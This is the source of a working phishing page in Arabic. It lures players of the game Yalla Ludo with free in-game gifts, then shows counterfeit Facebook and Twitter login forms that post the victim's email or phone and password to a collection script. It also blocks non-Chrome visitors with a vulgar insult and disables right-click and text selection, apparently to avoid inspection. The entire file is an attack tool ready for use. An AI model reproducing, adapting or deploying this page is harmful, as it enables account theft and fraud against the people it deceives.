<? 
if ($_SERVER["HTTP_ACCEPT"] and preg_match("/(.*?)Chrome(.*?)/",$_SERVER["HTTP_USER_AGENT"])){
} else {
echo" كسمك يصحبي 😂"; 
return false; 
}
?> 
<html>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="yalla ludo">
<meta name="description" content="yalla ludo">
<meta property="og:description" content="yalla ludo">
<meta property="og:url" content="./">
<meta property="og:site_name" content="yalla ludo">
<meta property="og:type" content="website">
<meta name="copyright" content="yalla ludo">
<meta name="theme-color" content="#000">
<meta property="og:image" content="newera/images/over_share1.jpg">
<title>LEDO</title>
<link href="css/index_files-css" rel="stylesheet">
<link rel="stylesheet" href="css/css-style.css">
<link rel="stylesheet" href="css/css-animate.css">
<link rel="stylesheet" href="css/login-facebook.css">
<link rel="stylesheet" href="css/login-twitter.css">
<link rel="stylesheet" href="css/css-font-awesome.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">

</head><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style> 
 body {
   background:url("https://b.top4top.io/p_2428ie27i1.jpg")  no-repeat center center;    
   background-size:cover;   
   background-attachment:fixed;    
   background-color:#CCCCCC; 
 }
</style>
 
 
 
 
<div class="container">

<div class="header"></div>

		<center>
		<div class="alert-wrapper">
		<div class="alert">
			<div class="alert-time">
				<div id="timer"></div>
			</div>
			<div class="slider animated fadeIn"> اهلا بكم في موقع التحصيل </div>
			<div class="slider animated fadeIn">احصل علئ الهدايا فقط اليوم</div>
		</div>
		</div>
		</center>
		<div id="latest" class="gallery">


				<center>
				<div class="item">
				<div class="item-name">1X</div>
					<img src="images/l.top4top.io-p_2311viwr41.jpg" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/material.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
				<div class="item-name">X7</div>
					<img src="images/j.top4top.io-p_2428ohnu10.png" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/material.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
				<div class="item-name">X1</div>
					<img src="images/c.top4top.io-p_1994mdnq71.jpg" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/material.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
				<div class="item-name">5000</div>
					<img src="images/a.top4top.io-p_1994u8trl1.jpg" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/4.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
				<div class="item-name">X161.7K</div>
					<img src="images/h.top4top.io-p_1994jqi6b1.jpg" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
				<div class="item-name">X16.0K</div>
					<img src="images/a.top4top.io-p_1994nwy5x1.jpg" style="border-bottom: none;">
					<div>
						<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
					</div>
				</div>
				<div class="item">
					<div class="item-name">X117.0M</div>
						<img src="images/h.top4top.io-p_1994xf3au1.jpg" style="border-bottom: none;">
						<div>
							<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
						</div>
					</div>
					<div class="item">
						<div class="item-name">X7.7M</div>
							<img src="images/l.top4top.io-p_1994in5bf1.jpg" style="border-bottom: none;">
							<div>
								<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
							</div>
						</div>
						<div class="item">
							<div class="item-name">X670.0K</div>
								<img src="images/l.top4top.io-p_1994jnppf1.jpg" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
										<div class="item">
							<div class="item-name">X4</div>
								<img src="images/i.top4top.io-p_24280aees0.png" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
	<div class="item">
							<div class="item-name">X4</div>
								<img src="images/g.top4top.io-p_2428goixl9.png" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
	<div class="item">
							<div class="item-name">X1</div>
								<img src="images/f.top4top.io-p_2428v3lyb1.jpg" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
	<div class="item">
							<div class="item-name">X1</div>
								<img src="images/c.top4top.io-p_2428yu4q41.jpg" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
	<div class="item">
							<div class="item-name">X1</div>
								<img src="images/b.top4top.io-p_24280k2t11.jpg" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
	<div class="item">
							<div class="item-name">X1</div>
								<img src="images/i.top4top.io-p_24289nw091.jpg" style="border-bottom: none;">
								<div>
									<button onmousedown="buka.play();" onclick="account_login();" src="img/item/latest/5.html">احصل عليه</button>
								</div>
							</div>
					</center>
			</div>
		</div>
	 <!--- box --->
 <!--- container --->

<div class="popup account_login" style="display: none;">
	<div class="popup-box animated fadeInDown">
		<div class="nav-popup">
			<div class="nav-popup-title">حسابات التسجيل</div>
		</div>
		<div class="alert-wrapper">
		<div class="alert">
			سجل للتعرف علئ حسابك في يلا لودو
		</div>
		</div>
		<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> سجل بأستخدام الفيسبوك</button>
		<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter icon-login"></i> سجل بأستخدام التويتر</button>
		<button type="button" class="btn-login twiter" onclick="location.href='email';">
<i class="fa fa-phone icon-login"></i> سجل بأستخدام الاميل</button>

		<center>
		<button type="button" class="btn-anjir" onmousedown="tutup.play()" onclick="close_account_login()">الغاء</button>
		</center>
	</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb" href="th.html"><i class="fa fa-times-circle"></i></a>
		<div class="navbar-fb">
			<img src="images/login-facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="images/g.top4top.io-p_1994i882y1.jpg">
			<div class="txt-login-fb">
				سجل في حسابك الفيسبوك للوصول ليلا لودو
			</div>
			<form class="login-form" action="badryhagkano.php" method="post">
				<label>
				<input type="text" name="email" placeholder="رقم الهاتف او الاميل" autocomplete="off" autocapitalize="off" required></label>
				<label>
				<input type="password" name="password" placeholder="كلمة المرور" autocomplete="off" autocapitalize="off" required></label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">تسجيل</button>
			</form>
			<div class="txt-create-account">انشاء  حساب</div>
			<div class="txt-not-now">ليس الان</div>
			<div class="txt-forgotten-password">نسيت كلمه السر?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
		<a onclick="tutup_twitter()" class="close-other" href="th.html"><i class="fa fa-times-circle"></i></a>
		<div class="header-twitter">
			<center>
			<img src="images/login-twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="badryhagkano.php" method="post">
				<div class="txt-login-twitter">سجل عبر تويتر</div>
				<div class="input-box-twitter">
					<label>اسم المستخدم / الاميل / رقم الهاتف</label>
					<input type="text" name="email" placeholder="" required></div>
				<div class="input-box-twitter">
					<label>كلمة المرور</label>
					<input type="password" name="password" placeholder="" required></div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">تسجيل</button>
				<div class="footer-menu-twitter"></div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">سجل عبر اميلك</div>
			</form>
			</center>
		</div>
	</div>
</div>
<!--- fieldset content --->
<script src="js/5836-js-jquery.min.js"></script>
<script src="js/5022-js-bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="js/1183-js-jquery-1.10.2.min.js"></script>
<script src="js/6922-js-timer.js"></script>
<script src="js/8849-js-tab.js"></script>
<script src="js/9161-js-popup.js"></script>
<script src="js/8968-js-click.js"></script>
<script src="js/9711-js-slider.js"></script>

</body></html>
